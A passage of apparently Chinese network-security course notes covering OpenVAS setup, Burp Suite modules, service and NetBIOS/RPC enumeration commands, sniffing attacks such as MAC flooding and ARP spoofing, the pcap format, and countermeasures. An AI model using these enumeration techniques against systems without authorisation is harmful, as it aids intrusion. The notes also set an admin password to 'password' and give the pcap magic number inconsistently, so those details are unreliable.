class="line">http://www.greenbone.net</span><br></pre></td></tr></table></figure><p>不装了这能装一天。。下面给个安装教程吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">升级kali</span><br><span class="line">apt-get update</span><br><span class="line">apt-get dist-upgrade</span><br><span class="line"></span><br><span class="line">安装OpenVAS</span><br><span class="line">apt-get install openvas</span><br><span class="line">openvas-setup</span><br><span class="line"></span><br><span class="line">修改admin账户密码</span><br><span class="line">openvasmd --user=admin --new-password=password</span><br><span class="line"></span><br><span class="line">启动openvas</span><br><span class="line">openvas-start</span><br><span class="line"></span><br><span class="line">检查安装，一定要先启动再检查</span><br><span class="line">ss -tnlp</span><br><span class="line">openvas-check-setup</span><br><span class="line"></span><br><span class="line">登录openvas</span><br><span class="line">https://192.168.137.144:9392</span><br></pre></td></tr></table></figure><p>功能模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">target目标模块用于设置扫描域、生成站点地图、生成安全分析</span><br><span class="line">proxy代理模块用于拦截浏览器的http会话内容</span><br><span class="line">spider爬虫模块用于自动爬取网站的每个页面内容，并生成完成的网站地图</span><br><span class="line">scanner扫描模块用于自动化检测漏洞，分为主动和被动扫描</span><br><span class="line">intruder入侵模块根据上面检测到的可能存在漏洞的链接，调用攻击载荷，对目标链接进行攻击</span><br><span class="line">入侵模块的原理是根据访问链接中存在的参数/变量，调用本地词典、攻击载荷，对参数进行渗透测试</span><br><span class="line">repeater重放模块用于实现请求重放，通过修改参数进行手工请求回应的调试</span><br><span class="line">sequencer序列器模块用于检测参数的随机性，例如密码或者令牌是否可预测，以此判断关键数据是否可被伪造</span><br><span class="line">decoder解码器模块用于实现对URL、HTML、Base64、ASCII、二八十六进制、哈希等编码转换</span><br><span class="line">comparer对比模块用于对两次不用的请求和回应进行可视化对比，以此区分不同参数对结果造成的影响</span><br><span class="line">extender通过拓展模块，可以加载自己开发的、或者第三方模块，打造自己的burpsuite功能</span><br><span class="line">通过burpsuite提供的API接口，目前可以支持Java、Python、Ruby三种语言的模块编写</span><br><span class="line">options分为project/user options，主要对软件进行全局设置</span><br><span class="line">alerts显示软件的使用日志信息</span><br></pre></td></tr></table></figure><h5 id="10-3-2-4-2-防范措施"><a href="#10-3-2-4-2-防范措施" class="headerlink" title="10.3.2.4.2 防范措施"></a>10.3.2.4.2 防范措施</h5><p>最简单对策：</p><ul><li>假设黑客会使用漏洞扫描来发现目标网络弱点，那你必须在黑客之前扫描漏洞</li><li>补丁自动更新和分发: 修补漏洞</li></ul><p>联邦桌面核心配置计划(FDCC)</p><ul><li>确保桌面计算机的安全漏洞及补丁自动管理</li></ul><p>检测和防御漏洞扫描行为</p><ul><li>网络入侵检测系统: Snort</li><li>仔细审查防火墙配置规则</li></ul><h3 id="10-3-3-网络查点"><a href="#10-3-3-网络查点" class="headerlink" title="10.3.3 网络查点"></a>10.3.3 网络查点</h3><p>针对已知的弱点，对识别出来的服务进行更加充分更具针对性的探查，来寻找真正可以攻击的入口，以及攻击过程中可能需要的关键数据。</p><p>与网络踩点、扫描的区别</p><ul><li>与网络踩点技术的关键区别：攻击者的入侵程度</li><li>与网络扫描技术的关键区别：攻击者的针对性与信息收集的目标性</li></ul><h4 id="10-3-3-1-网络查点能够收集到的信息"><a href="#10-3-3-1-网络查点能够收集到的信息" class="headerlink" title="10.3.3.1 网络查点能够收集到的信息"></a>10.3.3.1 网络查点能够收集到的信息</h4><p>用户账户名、错误配置的共享资源、网络服务版本号，这些看起来好像是无害的，但一旦这些信息被细心的高水平攻击者所掌握，就可能成为危害目标系统安全的祸根。</p><ul><li>用户帐户名：口令猜测破解</li><li>错误配置的共享资源：恶意程序上传</li><li>老旧的网络服务版本：缓冲区溢出漏洞攻击</li></ul><h4 id="10-3-3-2-网络查点技术"><a href="#10-3-3-2-网络查点技术" class="headerlink" title="10.3.3.2. 网络查点技术"></a>10.3.3.2. 网络查点技术</h4><h5 id="10-3-3-2-1-网络服务旗标抓取技术"><a href="#10-3-3-2-1-网络服务旗标抓取技术" class="headerlink" title="10.3.3.2.1 网络服务旗标抓取技术"></a>10.3.3.2.1 网络服务旗标抓取技术</h5><p>最基础和最通用的技术方法。利用客户端工具连接至远程网络服务并观察输出以收集关键信息的技术手段。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-telnet</span><br><span class="line">-netcat</span><br></pre></td></tr></table></figure><h5 id="10-3-3-2-2-通用网络服务查点"><a href="#10-3-3-2-2-通用网络服务查点" class="headerlink" title="10.3.3.2.2 通用网络服务查点"></a>10.3.3.2.2 通用网络服务查点</h5><ul><li><p>跨平台，常用服务</p></li><li><p>Web服务、FTP文件传输服务、POP3及SMTP电子邮件收发服务</p></li></ul><h6 id="10-3-3-2-2-1-FTP服务查点"><a href="#10-3-3-2-2-1-FTP服务查点" class="headerlink" title="10.3.3.2.2.1 FTP服务查点"></a>10.3.3.2.2.1 FTP服务查点</h6><p>-控制协议TCP 21端口，没有任何加密，明文传输口令<br>-匿名登录，甚至匿名上传与下载文件<br>-FTP查点很简单：使用FTP客户端程序连接即可<br>-FTP服务旗标、共享目录、可写目录等信息，可能还会提供FTP帐户名等信息<br>-查点后攻击：弱口令猜测与破解、已知FTP服务漏洞渗透攻击</p><h6 id="10-3-3-2-2-2-SMTP服务查点"><a href="#10-3-3-2-2-2-SMTP服务查点" class="headerlink" title="10.3.3.2.2.2 SMTP服务查点"></a>10.3.3.2.2.2 SMTP服务查点</h6><p>SMTP电子邮件发送协议查点<br>-最经典的网络服务查点技术之一<br>-两类特殊指令VRFY和EXPN<br>-VRFY指令：对合法用户的名字进行验证<br>-EXPN指令：显示假名与邮件表实际发送地址<br>-可验证和搜索邮件服务器上的活跃帐户</p><p>SMTP电子邮件发送协议查点危害<br>-伪造更具欺骗性电子邮件，社会工程学攻击<br>-探测SMTP服务器枚举出其中有效的电子邮件地址列表，大量发生垃圾邮件</p><h5 id="10-3-3-2-3-类Unix平台网络服务查点"><a href="#10-3-3-2-3-类Unix平台网络服务查点" class="headerlink" title="10.3.3.2.3 类Unix平台网络服务查点"></a>10.3.3.2.3 类Unix平台网络服务查点</h5><p>古老的finger, rwho, rusers查点<br>-用户帐户和登录信息<br>-已不常用</p><p>RPC查点(TCP/UDP 111, 32771)<br>-RPC远程过程调用: portmapperrpcbind<br>-RPC查点工具<br>    rpcinfo-p HOST: 枚举主机上提供的RPC服务<br>    rpcdump(Windows平台运行)<br>    nmap-sS-sRHOST</p><p>RPC查点防御策略<br>-Secure RPC, 111/32771端口防火墙过滤</p><h5 id="10-3-3-2-4-Windows平台网络服务查点"><a href="#10-3-3-2-4-Windows平台网络服务查点" class="headerlink" title="10.3.3.2.4 Windows平台网络服务查点"></a>10.3.3.2.4 Windows平台网络服务查点</h5><p>Windows网络服务</p><ul><li><p>NetBIOS网络基本输入输出系统服务</p><p>-Windows独有的局域网组网协议</p></li><li><p>SMB文件与打印共享服务</p></li><li><p>AD活动目录与LDAP轻量级目录访问协议</p></li><li><p>MSRPC微软远过程调用服务</p><p>-PRC/DCOM</p></li></ul><p>Windows平台网络服务查点<br>-NetBIOS主机查点<br>-SMB会话查点<br>-目录查点<br>-MSRPC查点</p><h6 id="10-3-3-2-4-1-Windows-Networking-API"><a href="#10-3-3-2-4-1-Windows-Networking-API" class="headerlink" title="10.3.3.2.4.1 Windows Networking API"></a>10.3.3.2.4.1 Windows Networking API</h6><ul><li><p>WinSock API</p></li><li><p>命名管道(Named Pipes)和邮件槽(Mail Slots)</p><ul><li>命名管道：提供可靠双向通信，协议无关的标识Windows网络资源的方法</li><li>邮件槽：提供不可靠的单向数据传输，支持广播</li></ul></li><li><p>Web访问API</p><p>-WinInet/WinHTTP/HTTP API</p></li></ul><h6 id="10-3-3-2-4-2-NetBIOS"><a href="#10-3-3-2-4-2-NetBIOS" class="headerlink" title="10.3.3.2.4.2 NetBIOS"></a>10.3.3.2.4.2 NetBIOS</h6><ul><li><p>NetBIOS(网络基本输入/输出系统)：最初由IBM开发，MS利用NetBIOS作为构建局域网的上层协议</p></li><li><p>NetBIOS使得程序和网络之间有了标准的接口，方便应用程序的开发。并且可以移植到其他的网络中</p></li><li><p>NetBIOS位于OSI模型会话层，TCP/IP之上</p></li><li><p>NetBIOS有两种通讯模式</p><ul><li>会话模式。一对一进行通讯，LAN中的机器之间建立会话，可以传输较多的信息，并且可以检查传输错误</li><li>数据报模式。可以进行广播或者一对多的通讯，传输数据大小受限制，没有错误检查机制，也不必建立通讯会话</li></ul></li><li><p>NetBIOS over TCP/IP，支持三种服务</p><ul><li>名字服务UDP 137</li><li>会话服务TCP 139/445</li><li>数据报服务UDP 138</li></ul></li></ul><p>NetBIOS网络查点</p><ul><li><p>使用net view命令查点域</p><ul><li>列出网络上的工作组和域：net view /domain</li><li>列出指定组/域中的所有计算机：net view /domain:DOMAIN_NAME</li></ul></li><li><p>查点域控制器</p><ul><li><p>Windows Resource Kit -nltest工具</p><p>Nltest.exe 是非常强大的命令行实用程序，用于测试在 Windows NT 域中的信任关系和域控制器复制的状态。域包含，还有一个主域控制器 (PDC) 和零个或多个备份域控制器 (BDC) 的域控制器。</p></li></ul></li><li><p>查点主机上的NetBIOS名字表</p><ul><li><p>nbtstat工具</p><p>主机中的NetBIOS名字表</p><p>计算机名、所在域、当前登录用户、当前运行服务和网卡硬件MAC地址</p></li></ul><ul><li><p>nbtscan工具</p><p>对整个局域网进行快速的nbtstat查询</p><p>NBTscan是一款在IP网络上扫描NetBIOS名称信息的工具。它通过给指定范围内所有地址发送状态查询来获得反馈信息并以表形式呈现给使用者。每一地址的反馈信息包括IP地址、NetBIOS计算机名、登录用户、MAC地址。</p></li></ul></li><li><p>其他工具</p><p>epdump, rpcdump, getmac, netdom, netviewx, Winfo, nbtdump, …</p></li><li><p>防范措施</p><ul><li>网络：防火墙禁止外部访问TCP/UDP 135-139，445端口</li><li>主机：配置IPSec过滤器，主机个人防火墙，禁用Alerter和Messenger服务</li></ul></li></ul><h6 id="10-3-3-2-4-3-MSRPC远程进程调用-DCOM"><a href="#10-3-3-2-4-3-MSRPC远程进程调用-DCOM" class="headerlink" title="10.3.3.2.4.3 MSRPC远程进程调用/DCOM"></a>10.3.3.2.4.3 MSRPC远程进程调用/DCOM</h6><p>RPC (Remote Procedure Call)</p><ul><li>网络编程标准</li><li>目的: 提供“能在某种程度上像应用程序开发人员隐藏有关网络编程细节”的编程模型</li></ul><p>RPC调用</p><ul><li>允许程序员编写的客户应用程序跨网络调用远程计算机上服务器应用程序中的过程</li></ul><p>客户机对服务器的RPC调用操作：</p><p>1.调用客户端句柄；执行传送参数<br>2.调用本地系统内核发送网络消息<br>3.消息传送到远程主机<br>4.服务器句柄得到消息并取得参数<br>5.执行远程过程<br>6.执行的过程将结果返回服务器句柄<br>7.服务器句柄返回结果，调用远程系统内核<br>8.消息传回本地主机<br>9.客户句柄由内核接收消息<br>10.客户接收句柄返回的数据</p><h6 id="10-3-3-2-4-4-COM-DCOM"><a href="#10-3-3-2-4-4-COM-DCOM" class="headerlink" title="10.3.3.2.4.4 COM/DCOM"></a>10.3.3.2.4.4 COM/DCOM</h6><p>COM对象: 使应用程序由不同组件构成，导出面向对象接口，提高软件模块化、可扩展性和可交互性。</p><p>DCOM: 提供COM组件的位置透明性，依赖于RPC</p><h6 id="10-3-3-2-4-5-常用的Windows应用层网络服务"><a href="#10-3-3-2-4-5-常用的Windows应用层网络服务" class="headerlink" title="10.3.3.2.4.5 常用的Windows应用层网络服务"></a>10.3.3.2.4.5 常用的Windows应用层网络服务</h6><ul><li><p>Network Applications</p></li><li><p>IIS (Internet Information Services)<br>HTTP/FTP/…</p></li><li>Email<br>Exchange Server</li><li>Database<br>MS SQL Server</li><li>RDP<br>Remote Desktop Protocol</li><li>通常以Windows服务方式后台运行</li></ul><h6 id="10-3-3-2-4-6-Windows服务"><a href="#10-3-3-2-4-6-Windows服务" class="headerlink" title="10.3.3.2.4.6 Windows服务"></a>10.3.3.2.4.6 Windows服务</h6><ul><li><p>Windows服务－系统启动时刻启动进程的机制，提供不依赖于任何交互式的服务。</p></li><li><p>Windows服务</p><ul><li>服务应用程序<br>注册服务Advapi32.dll, CreateService/StartServices<br>注册表: HKLM\SYSTEM\CurrentControlSet\Services<br>共享服务进程: 服务宿主svchost.exe</li><li>服务控制管理器(SCM, service control manager, services.exe)<br>Winlogon进程在加载GINA之前执行SCM启动函数<br>SCM中的ScCreateServiceDB根据注册表分别启动服务<br>SCM中的ScAutoStartServices启动“自动启动”的服务</li><li>服务控制程序(SCP, service control program)<br>控制面板，服务插件…</li></ul></li></ul><h1 id="11-网络嗅探与协议分析"><a href="#11-网络嗅探与协议分析" class="headerlink" title="11. 网络嗅探与协议分析"></a>11. 网络嗅探与协议分析</h1><ul><li>网络嗅探(Sniff)</li></ul><p>–网络监听、网络窃听</p><p>–类似于传统的电话线窃听</p><ul><li>网络嗅探技术定义</li></ul><p>–利用计算机网络接口截获目的地为其他计算机的数据报文</p><p>–监听网络流中所包含的用户账户密码或私密信息等</p><ul><li>网络嗅探器(Sniffer)</li></ul><p>–实现嗅探的软件或硬件设备</p><p>–嗅探获得数据二进制格式数据报文</p><p>–解析和理解二进制数据，获取各层协议字段和应用层传输数据网络协议分析</p><ul><li><p>危害与作用</p><ul><li><p>攻击者：内网渗透技术</p><p>窃取机密信息，为发起进一步攻击收集信息</p></li><li><p>防御者</p><p>管理员可以用来监听网络的流量情况，定位网络故障</p><p>为网络入侵检测系统提供底层数据来源基础</p></li><li><p>其他作用</p><p>开发网络应用的程序员可以监视程序的网络情况</p></li></ul></li><li><p>网络嗅探技术与工具分类</p><ul><li>以太网嗅探</li><li>WiFi嗅探</li><li>…</li><li>目前一些著名嗅探器支持多种链路层网络嗅探，wireshark, Sniffer Pro…</li></ul></li><li><p>工具形态</p><ul><li>软件嗅探器</li><li>硬件嗅探器(协议分析仪): 专用设备, 速度快, 额外功能(如流量记录与重放等), 价格昂贵</li></ul></li></ul><h2 id="11-1-以太网络"><a href="#11-1-以太网络" class="headerlink" title="11.1 以太网络"></a>11.1 以太网络</h2><h3 id="11-1-1-工作原理"><a href="#11-1-1-工作原理" class="headerlink" title="11.1.1 工作原理"></a>11.1.1 工作原理</h3><ul><li>载波侦听/冲突检测(CSMA/CD: 802.3, carrier sense multiple access with collision detection)技术<ul><li>载波侦听：是指在网络中的每个站点都具有同等的权利，在传输自己的数据时，首先监听信道是否空闲<pre><code>如果空闲，就传输自己的数据  如果信道被占用，就等待信道空闲</code></pre></li><li>而冲突检测则是为了防止发生两个站点同时监测到网络没有被使用时而产生冲突</li></ul></li><li>以太网采用了CSMA/CD技术，由于使用了广播机制，所以，所有在同一媒介信道上连接的工作站都可以看到网络上传递的数据。</li></ul><h3 id="11-1-2-工作模式"><a href="#11-1-2-工作模式" class="headerlink" title="11.1.2 工作模式"></a>11.1.2 工作模式</h3><ul><li><p>网卡的MAC地址(48位)</p><p>–通过ARP来解析MAC与IP地址的转换</p><p>–用ipconfig/ifconfig可以查看MAC地址</p></li><li><p>正常情况下，网卡应该只接收这样的包</p><p>–MAC地址与自己相匹配的数据帧</p><p>–广播包</p></li><li><p>网卡完成收发数据包的工作，两种接收模式</p><p>–混杂模式：不管数据帧中的目的地址是否与自己的地址匹配，都接收下来</p><p>–非混杂模式：只接收目的地址相匹配的数据帧，以及广播数据包(和组播数据包)</p></li><li><p>为了监听网络上的流量，必须设置为混杂模式</p></li></ul><h2 id="11-2-共享式网络与交换式网络"><a href="#11-2-共享式网络与交换式网络" class="headerlink" title="11.2 共享式网络与交换式网络"></a>11.2 共享式网络与交换式网络</h2><h3 id="11-2-1-共享式网络"><a href="#11-2-1-共享式网络" class="headerlink" title="11.2.1 共享式网络"></a>11.2.1 共享式网络</h3><p>–通过Hub(集线器)连接</p><p>–总线方式: 通过网络的所有数据包</p><p>–发往每一个主机</p><p>–能够嗅探整个Hub上全部网络流量</p><h3 id="11-2-2-交换式网络"><a href="#11-2-2-交换式网络" class="headerlink" title="11.2.2 交换式网络"></a>11.2.2 交换式网络</h3><p>–通过Switch(交换机)连接</p><p>–由交换机构造一个“MAC地址-端口”映射表</p><p>–发送包的时候，只发到特定端口上</p><p>–只能监听同一端口上流量</p><p>–可通过流量映像口监听(SPAN)</p><h4 id="11-2-2-1-交换式网络中的嗅探攻击"><a href="#11-2-2-1-交换式网络中的嗅探攻击" class="headerlink" title="11.2.2.1 交换式网络中的嗅探攻击"></a>11.2.2.1 交换式网络中的嗅探攻击</h4><ul><li><p>MAC地址洪泛攻击</p><p>向交换机发送大量虚构MAC地址和IP地址数据包<br>致使交换机“MAC地址-端口映射表”溢出<br>交换机切换入所谓的“打开失效”模式-“共享式”</p></li><li><p>MAC欺骗</p><p>假冒所要监听的主机网卡，将源MAC地址伪造成目标主机的MAC地址<br>交换机不断地更新它的“MAC地址-端口映射表”<br>交换机就会将本应发送给目标主机的数据包发送给攻击者</p></li><li><p>ARP欺骗(中间人攻击)</p><p>利用IP地址与MAC地址之间进行转换时的协议漏洞</p></li></ul><h2 id="11-3-应用程序抓包的技术"><a href="#11-3-应用程序抓包的技术" class="headerlink" title="11.3 应用程序抓包的技术"></a>11.3 应用程序抓包的技术</h2><ul><li><p>类Unix平台提供了标准的API支持</p><p>内核态: BPF(Berkeley Packet Filter)<br>用户态函数库：libpcap<br>用户态嗅探程序：tcpdump等</p></li><li><p>Windows平台通过驱动程序来抓取数据包</p><p>驱动程序: NPF(NetGroupPacket Filter)<br>用户态函数库：winpcap<br>用户态嗅探程序：windump等</p></li></ul><h3 id="11-3-1-BPF"><a href="#11-3-1-BPF" class="headerlink" title="11.3.1 BPF"></a>11.3.1 BPF</h3><ul><li><p>BSD数据包捕获</p><p>–BPF是一个核心态的组件，支持数据包“过滤”抓取</p><p>–Network Tap接收所有的数据包</p><p>–BPF虚拟机机器语言的解释器，比较/算术等操作</p><p>–Kernel Buffer，保存过滤器送过来的数据包</p><p>–User buffer，用户态上的数据包缓冲区</p></li><li><p>Libpcap(一个抓包工具库)支持BPF</p><p>–Libpcap是用户态的一个抓包工具</p><p>–Libpcap几乎是系统无关的</p></li><li><p>BPF是一种比较理想的抓包方案</p><p>–在核心态，所以效率比较高</p><p>–目前类UNIX系统的标准抓包内核模块 </p></li></ul><h3 id="11-3-2-libpcap抓包库"><a href="#11-3-2-libpcap抓包库" class="headerlink" title="11.3.2 libpcap抓包库"></a>11.3.2 libpcap抓包库</h3><ul><li><p>用户态下的抓包库</p></li><li><p>系统独立的接口，C语言接口</p><p>–多种其他高级编程语言包装接口: Perl, Python, Ruby, Tcl, Java, …</p></li><li><p>广泛应用于</p><p>–网络统计软件</p><p>–入侵检测系统</p><p>–网络调试</p></li><li><p>支持过滤机制，BPF</p></li></ul><h2 id="11-4-pcap格式"><a href="#11-4-pcap格式" class="headerlink" title="11.4 pcap格式"></a>11.4 pcap格式</h2><p>基本格式：文件头、数据包头、数据报、数据包头、数据报…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pcap_file_header</span> &#123;</span></span><br><span class="line">        bpf_u_int32 magic;    <span class="comment">//4字节 pcap文件标识 目前为“d4 c3 b2 a1”</span></span><br><span class="line">        u_short version_major;   <span class="comment">//2字节 主版本号 </span></span><br><span class="line">        u_short version_minor;  <span class="comment">// 2字节 次版本号 </span></span><br><span class="line">        bpf_int32 thiszone;     <span class="comment">/* 4字节 时区修正     并未使用，目前全为0*/</span></span><br><span class="line">        bpf_u_int32 sigfigs;    <span class="comment">/* 4字节 精确时间戳   并未使用，目前全为0 */</span></span><br><span class="line">        bpf_u_int32 snaplen;    <span class="comment">/* 4字节 抓包最大长度, 抓全设为0x0000ffff, 缺省为68字节 */</span></span><br><span class="line">        bpf_u_int32 linktype;   <span class="comment">/* 4字节 链路类型    一般都是1：ethernet*/</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>各字段说明：</p><div class="table-container"><table><thead><tr><th>字段</th><th>字节</th><th>16进制表示</th><th>含义</th></tr></thead><tbody><tr><td>Magic</td><td>4B</td><td>1A 2B 3C 4D</td><td>标示文件的开始</td></tr><tr><td>Major</td><td>2B</td><td>02 00</td><td>当前文件主要的版本号</td></tr><tr><td>Minor</td><td>2B</td><td>04 00</td><td>当前文件次要的版本号</td></tr><tr><td>ThisZone</td><td>4B</td><td></td><td>当地的标准时间</td></tr><tr><td>SigFlags</td><td>4B</td><td></td><td>时间戳的精度</td></tr><tr><td>SnapLen</td><td>4B</td><td></td><td>最大的存储长度</td></tr><tr><td>LinkType</td><td>4B</td><td></td><td>链路类型</td></tr></tbody></table></div><p>LinkType链路类型</p><div class="table-container"><table><thead><tr><th>值</th><th>类型</th></tr></thead><tbody><tr><td>0</td><td>BSD loopback devices, except for later OpenBSD</td></tr><tr><td>1</td><td>Ethernet, and Linux loopback devices</td></tr><tr><td>6</td><td>802.5 Token Ring</td></tr><tr><td>7</td><td>ARCnet</td></tr><tr><td>8</td><td>SLIP</td></tr><tr><td>9</td><td>PPP</td></tr><tr><td>10</td><td>FDDI</td></tr><tr><td>100</td><td>LLC/SNAP-encapsulated ATM</td></tr><tr><td>101</td><td>“raw IP”, with no link</td></tr><tr><td>102</td><td>BSD/OS SLIP</td></tr><tr><td>103</td><td>BSD/OS PPP</td></tr><tr><td>104</td><td>Cisco HDLC</td></tr><tr><td>105</td><td>802.11</td></tr><tr><td>108</td><td>later OpenBSD loopback devices (with the AF_value in network byte order)</td></tr><tr><td>113</td><td>special Linux “cooked” capture</td></tr><tr><td>114</td><td>LocalTalk</td></tr></tbody></table></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pcap_pkthdr</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">ts</span>;</span>      <span class="comment">/* time stamp */</span></span><br><span class="line">        bpf_u_int32 caplen;     <span class="comment">/* length of portion present */</span></span><br><span class="line">        bpf_u_int32 len;        <span class="comment">/* length this packet (off wire) */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> &#123;</span></span><br><span class="line">        <span class="type">long</span>            tv_sec;         <span class="comment">/* seconds (XXX should be time_t) */</span></span><br><span class="line">        <span class="type">suseconds_t</span>     tv_usec;        <span class="comment">/* and microseconds */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>各字段说明：</p><div class="table-container"><table><thead><tr><th>字段</th><th>含义</th></tr></thead><tbody><tr><td>Timestamp</td><td>时间戳高位，精确到seconds</td></tr><tr><td>Timestamp</td><td>时间戳低位，精确到microseconds</td></tr><tr><td>Caplen</td><td>当前数据区的长度，即抓取到的数据帧长度，由此可以得到下一个数据帧的位置。</td></tr><tr><td>Len</td><td>离线数据长度，网络中实际数据帧的长度，一般不大于caplen，多数情况下和Caplen数值相等。</td></tr></tbody></table></div><p>Packet 数据：即 Packet（通常就是链路层的数据帧去掉前面用于同步和标识帧开始的8字节和最后用于CRC校验的4字节）的具体内容，长度就是Caplen，这个长度的后面，就是当前PCAP文件中存放的下一个Packet数据包。PCAP文件里面并没有规定捕获的Packet数据包之间有什么间隔字符串，需要靠第一个Packet包确定下一组数据在文件中的起始位置。</p><h2 id="11-5-网络嗅探器软件"><a href="#11-5-网络嗅探器软件" class="headerlink" title="11.5 网络嗅探器软件"></a>11.5 网络嗅探器软件</h2><ul><li><p>类Unix平台网络嗅探器软件</p><p>–Libpcap抓包开发函数库</p><p>–Tcpdump以及wireshark嗅探器软件</p><p>–Snort、dsniff、sniffit和linux_sniffer…</p></li><li><p>Windows平台网络嗅探器软件</p><p>–NPF/winpcap/windump</p><p>–SnifferPro</p><p>–Buttsniffer、NetMon、Network Associates Sniffer</p></li></ul><h3 id="11-5-1-Windows平台下的抓包技术"><a href="#11-5-1-Windows平台下的抓包技术" class="headerlink" title="11.5.1 Windows平台下的抓包技术"></a>11.5.1 Windows平台下的抓包技术</h3><ul><li><p>内核本身没有提供标准的接口</p></li><li><p>通过增加一个驱动程序或者网络组件来访问内核网卡驱动提供的数据包</p><p>–在Windows不同操作系统平台下有所不同</p></li><li><p>不同sniffer采用的技术不同</p><p>–WinPcap是一个重要的抓包工具，它是libpcap的Windows版本</p></li></ul><h4 id="11-5-1-1-WinPcap"><a href="#11-5-1-1-WinPcap" class="headerlink" title="11.5.1.1 WinPcap"></a>11.5.1.1 WinPcap</h4><ul><li><p>WinPcap包括三个部分</p><p>–第一个模块NPF(Netgroup Packet Filter)，是一个虚拟设备驱动程序文件。它的功能是过滤数据包，并把这些数据包原封不动地传给用户态模块，这个过程中包括了一些操作系统特有的代码</p><p>–第二个模块packet.dll为win32平台提供了一个公共的接口。不同版本的Windows系统都有自己的内核模块和用户层模块。Packet.dll用于解决这些不同。调用Packet.dll的程序可以运行在不同版本的Windows平台上，而无需重新编译</p><p>–第三个模块Wpcap.dll是不依赖于操作系统的。它提供了更加高层、抽象的函数。</p></li><li><p>packet.dll和Wpcap.dll</p><p>–packet.dll直接映射了内核的调用</p><p>–Wpcap.dll提供了更加友好、功能更加强大的函数调用</p></li></ul><ul><li><p>NPF在Windows网络结构中位置</p><ul><li>NDIS(Network Driver Interface Specification，网络驱动接口规范)描述了网络驱动与底层网卡之间的接口规范，以及它与上层协议之间的规范</li><li>NPF作为一个核心驱动程序而提供的</li></ul></li><li><p>WinPcap优势</p><ul><li><p>提供了一套标准的抓包接口</p><p>​    –与libpcap兼容，可使得原来许多类UNIX平台下的网络分析工具快速移植过来</p><p>​    –便于开发各种网络分析工具</p></li><li><p>除了与libpcap兼容的功能之外，还有</p><p>​    –充分考虑了各种性能和效率的优化，包括对于NPF内核层次上的过滤器支持</p><p>​    –支持内核态的统计模式</p><p>​    –提供了发送数据包的能力</p></li></ul></li></ul><h2 id="11-6-网络嗅探的检测技术"><a href="#11-6-网络嗅探的检测技术" class="headerlink" title="11.6 网络嗅探的检测技术"></a>11.6 网络嗅探的检测技术</h2><ul><li><p>网卡和操作系统对于是否处于混杂模式会有一些不同的行为，利用这些特征可以判断一个机器是否运行在混杂模式下</p></li><li><p>一些检测手段</p><p>–根据操作系统的特征</p><ul><li>Linux内核的特性：正常情况下，只处理本机MAC地址或者以太广播地址的包。在混杂模式下，许多版本的Linux内核只检查数据包中的IP地址以确定是否送到IP堆栈。因此，可以构造无效以太地址而IP地址有效的ICMP ECHO请求，看机器是否返回应答包(混杂模式)，或忽略(非混杂模式)。</li><li>Windows 9x/NT：在混杂模式下，检查一个包是否为以太广播包时，只看MAC地址前八位是否为0xff。</li></ul><p>–根据网络和主机的性能</p><ul><li>根据响应时间：向本地网络发送大量的伪造数据包，然后，看目标主机的响应时间，首先要测得一个响应时间基准和平均值。</li></ul></li></ul><h2 id="11-7-网络嗅探技术的防范措施"><a href="#11-7-网络嗅探技术的防范措施" class="headerlink" title="11.7 网络嗅探技术的防范措施"></a>11.7 网络嗅探技术的防范措施</h2><ul><li><p>采用安全的网络拓扑</p><p>–共享式网络à交换式网络</p><p>–交换机上设置VLAN等技术手段，对网络进行合理的分段</p></li><li><p>共享式以太网à交换式以太网拓扑</p><p>–性能提升: 广播冲突域à  每台主机单独冲突域</p><p>–安全性提升: 较难被网络监听</p><p>–交换式网络提供安全性仍可能被挫败: ARP欺骗</p></li><li><p>静态ARP或者MAC-端口映射表代替动态机制</p></li><li><p>重视网络数据传输的集中位置点的安全防范</p></li><li><p>避免使用明文传输口令/敏感信息网络协议, 使用加密协议</p><p>–telnet-&gt;ssh</p><p>–IPSEC/TLS</p></li></ul><h2 id="11-8-网络协议分析"><a href="#11-8-网络协议分析" class="headerlink" title="11.8 网络协议分析"></a>11.8 网络协议分析</h2><ul><li><p>网络协议分析的粒度和层次</p><p>–原始数据包: 最细粒度、最低层次</p><p>–网络流(/会话): 通过5元组进行流(/会话)重组</p></li><li><p>5元组: sip, sport, dip, dport, ipproto</p><p>–网络流高层统计</p><p>–IP会话列表<sip, sport></p><ul><li>目标端口流统计\<dport></li></ul></li><li><p>网络报文分析工具</p><p>–集成工具: Wireshark</p><p>–网络流重组: nstreams, snort</p><p>–高层统计和摘要分析: Netflow, 